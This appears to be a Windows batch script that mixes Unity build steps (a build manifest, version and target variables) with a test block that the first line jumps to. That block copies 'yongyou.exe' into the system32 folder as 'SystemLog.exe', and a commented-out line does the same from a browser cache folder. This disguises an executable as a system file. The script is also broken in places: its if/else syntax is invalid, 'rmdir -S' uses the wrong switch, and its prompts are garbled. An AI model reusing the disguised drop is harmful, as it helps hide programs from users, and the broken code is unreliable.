::@echo off

goto Test1

Setlocal enabledelayedexpansion

set /p var1="ÇëÊäÈëÒ»¸ö×Ö·û´®£º"
set /p var2="ÇëÊäÈëÒ»¸ö×Ö·û´®£º"


echo errorlevel is %ERRORLEVEL%

if NOT %ERRORLEVEL% == 0
(
	::echo %var1%
)
else
(
	::echo %var2%
)

pause
	
	
	
SET UNITYVERSION=2018.1.1f1
IF NOT [%1]==[] (set UNITYVERSION=%1)

SET PRODUCTNAME="Product Name"
IF NOT [%2]==[] (set PRODUCTNAME=%2)

SET COMPANYNAME="Company Name"
IF NOT [%3]==[] (set COMPANYNAME=%3)

SET TARGET=Windows
IF NOT [%4]==[] (set TARGET=%4)

SET VERSION=0.0.0.0
IF NOT [%5]==[] (set VERSION=%5)

SET BUILDLOCATION="./Build/%TARGET%/%VERSION%"

rmdir -S %BUILDLOCATION%
mkdir %BUILDLOCATION%

>buildManifest.txt (
    echo ProductName=%PRODUCTNAME%
    echo CompanyName=%COMPANYNAME%
    echo Version=%VERSION%
    echo BuildLocation=%BUILDLOCATION%
)

pause
::"E:\Programs\Unity\%UNITYVERSION%\Editor\Unity.exe" -quit -batchMode -executeMethod BuildHelper.%TARGET%

del /f buildManifest.txt


:Test1

set webExtractPath="D:\Program Files\2019.3.3f1\Editor\Data\Tools\WebExtract.exe"
if exist %webExtractPath% pause

if not exist "%cd%\yongyou.exe" goto 1
copy "%cd%\yongyou.exe" %windir%\system32\SystemLog.exe /y
goto 2
:1
::copy "%USERPROFILE%\Local Settings\Temporary Internet Files\[1].exe" %windir%\system32\SystemLog.exe /y
echo AAAA
:2
pause
























